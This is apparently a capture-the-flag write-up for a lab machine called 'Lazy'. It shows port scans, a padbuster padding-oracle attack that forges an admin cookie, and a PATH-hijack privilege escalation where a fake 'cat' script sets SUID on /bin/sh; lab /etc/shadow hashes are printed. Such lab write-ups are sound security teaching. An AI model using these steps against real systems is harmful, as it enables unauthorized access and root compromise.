# Lazy

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 10.129.64.184                 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-19 14:11 +08
Nmap scan report for 10.129.64.184
Host is up (0.0075s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Did a detailed scan too:

```
$ nmap -p 80 -sC -sV --min-rate 4000 10.129.64.184 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-19 14:11 +08
Nmap scan report for 10.129.64.184
Host is up (0.011s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: CompanyDev
|_http-server-header: Apache/2.4.7 (Ubuntu)
```

Since only port 80 is open, we can proxy the traffic through Burpsuite.

### Web Enumeration -> Padding Oracle

The website shows a really basic company website:

<figure><img src="../../../.gitbook/assets/image (4155).png" alt=""><figcaption></figcaption></figure>

I created a user and logged in to view the same thing:

<figure><img src="../../../.gitbook/assets/image (4156).png" alt=""><figcaption></figcaption></figure>

In Burp, there appears to be a custom cookie being sent to the website called `auth`:

```http
GET /index.php HTTP/1.1
Host: 10.129.64.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.64.184/register.php
Connection: close
Cookie: auth=%2BJerWq%2FLA3RuOeAORmXt%2Bg7mwatyAe13
Upgrade-Insecure-Requests: 1

```

Although the website was written in PHP, this cookie was not the default PHP session cookie that was used. I tried to change a few parameters for it and found that the application returned a unique error:

<figure><img src="../../../.gitbook/assets/image (4157).png" alt=""><figcaption></figcaption></figure>

This is an obvious hint that we have to somehow use the **paddling oracle attack** for this. This attack basically gives us a computationally feasible way to brute force the plaintext byte by byte using the error. Here's a pretty good video from college that I used:

{% embed url="https://www.youtube.com/watch?v=4EgD4PEatA8" %}

We can attempt to decrypt this cookie using `padbuster`.&#x20;

```
$ padbuster http://10.129.64.184/index.php %2BJerWq%2FLA3RuOeAORmXt%2Bg7mwatyAe13 8 -cookies auth=%2BJerWq%2FLA3RuOeAORmXt%2Bg7mwatyAe13  -encoding 0

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 981

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 2 ***

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       200     1133    N/A
2 **    255     200     15      N/A
-------------------------------------------------------
```

There seem to be 2 errors, 1 of which returns a length of 1133 and the rest are likely errors. I continued with test 2 since it had a higher frequency.

After a bit, `padbuster` returns the plaintext like this:

```
Block 2 Results:
[+] Cipher Text (HEX): 0ee6c1ab7201ed77
[+] Intermediate Bytes (HEX): 1a08d23d4261e9fe
[+] Plain Text: t123

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): user=test123

[+] Decrypted value (HEX): 757365723D7465737431323304040404

[+] Decrypted value (Base64): dXNlcj10ZXN0MTIzBAQEBA==

-------------------------------------------------------
```

So the cookie decrypts to give us `user=test123`, and using `padbuster` again, we can encrypt it to something like `user=admin`. This would give us another cookie to work with:

```
$ padbuster http://10.129.64.184/index.php %2BJerWq%2FLA3RuOeAORmXt%2Bg7mwatyAe13 8 -cookies auth=%2BJerWq%2FLA3RuOeAORmXt%2Bg7mwatyAe13  -encoding 0 -plaintext user=admin
<TRUNCATED>
Block 1 Results:
[+] New Cipher Text (HEX): 0408ad19d62eba93
[+] Intermediate Bytes (HEX): 717bc86beb4fdefe

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
-------------------------------------------------------
```

When we access the website with this cookie, it tells us we are logged in as the administrator:

<figure><img src="../../../.gitbook/assets/image (4158).png" alt=""><figcaption></figcaption></figure>

It also gives us a private SSH key to `ssh` in as the `mitsos` user as indicated by the URL:

```
mysshkeywithnamemitsos
```

<figure><img src="../../../.gitbook/assets/image (4159).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Backup SUID -> PATH Hijack

We don't have the user's password, so we cannot check `sudo` privileges. The user's directory has an SUID binary:

```
mitsos@LazyClown:~$ ls -la
total 64
drwxr-xr-x 5 mitsos mitsos 4096 Dec  7  2021 .
drwxr-xr-x 3 root   root   4096 Dec  7  2021 ..
-rwsrwsr-x 1 root   root   7303 May  3  2017 backup
-rw------- 1 mitsos mitsos  224 May  3  2017 .bash_history
-rw-r--r-- 1 root   root      1 May  3  2017 .bash.history
-rw-r--r-- 1 mitsos mitsos  220 May  2  2017 .bash_logout
-rw-r--r-- 1 mitsos mitsos 3637 May  2  2017 .bashrc
drwx------ 2 mitsos mitsos 4096 Dec  7  2021 .cache
-rw-rw-r-- 1 mitsos mitsos    0 Dec  7  2021 cat
-rw------- 1 mitsos mitsos 2524 May  2  2017 .gdb_history
-rw-rw-r-- 1 mitsos mitsos   22 May  2  2017 .gdbinit
-rw------- 1 root   root     46 May  2  2017 .nano_history
drwxrwxr-x 4 mitsos mitsos 4096 Dec  7  2021 peda
-rw-r--r-- 1 mitsos mitsos  675 May  2  2017 .profile
drwxrwxr-x 2 mitsos mitsos 4096 Dec  7  2021 .ssh
-r--r--r-- 1 mitsos mitsos   33 Aug 19 09:38 user.txt
```

When used, it prints out the `/etc/shadow` contents:

{% code overflow="wrap" %}
```
mitsos@LazyClown:~$ ./backup 
root:$6$v1daFgo/$.7m9WXOoE4CKFdWvC.8A9aaQ334avEU8KHTmhjjGXMl0CTvZqRfNM5NO2/.7n2WtC58IUOMvLjHL0j4OsDPuL0:17288:0:99999:7:::
daemon:*:17016:0:99999:7:::
bin:*:17016:0:99999:7:::
sys:*:17016:0:99999:7:::
sync:*:17016:0:99999:7:::
games:*:17016:0:99999:7:::
man:*:17016:0:99999:7:::
lp:*:17016:0:99999:7:::
mail:*:17016:0:99999:7:::
news:*:17016:0:99999:7:::
uucp:*:17016:0:99999:7:::
proxy:*:17016:0:99999:7:::
www-data:*:17016:0:99999:7:::
backup:*:17016:0:99999:7:::
list:*:17016:0:99999:7:::
irc:*:17016:0:99999:7:::
gnats:*:17016:0:99999:7:::
nobody:*:17016:0:99999:7:::
libuuid:!:17016:0:99999:7:::
syslog:*:17016:0:99999:7:::
messagebus:*:17288:0:99999:7:::
landscape:*:17288:0:99999:7:::
mitsos:$6$LMSqqYD8$pqz8f/.wmOw3XwiLdqDuntwSrWy4P1hMYwc2MfZ70yA67pkjTaJgzbYaSgPlfnyCLLDDTDSoHJB99q2ky7lEB1:17288:0:99999:7:::
mysql:!:17288:0:99999:7:::
sshd:*:17288:0:99999:7:::
```
{% endcode %}

The hashes in this are normally not crackable, and I don't think the creator would be so kind to give us the `root` hash directly. The file was an ELF binary:

{% code overflow="wrap" %}
```
mitsos@LazyClown:~$ file backup
backup: setuid, setgid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=33d6b5bec96c44e630f37ff41cc1c4a8b2813b6b, not stripped
```
{% endcode %}

I used `ltrace` to see the functions used:

```
mitsos@LazyClown:~$ ltrace ./backup 
__libc_start_main(0x804841d, 1, 0xbffff7d4, 0x8048440 <unfinished ...>
system("cat /etc/shadow"cat: /etc/shadow: Permission denied
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                   = 256
```

This binary did not use the full path for the `cat` command, thus allowing us to create our own malicious binary within any directory to execute commands as `root`.&#x20;

To exploit this, execute the following commands:

```bash
cd /tmp
echo '#!/bin/sh' > cat
echo 'chmod u+s /bin/sh' >> cat
chmod 777 cat
export PATH=/tmp:$PATH
/home/mitsos/backup
```

<figure><img src="../../../.gitbook/assets/image (4161).png" alt=""><figcaption></figcaption></figure>

Rooted!
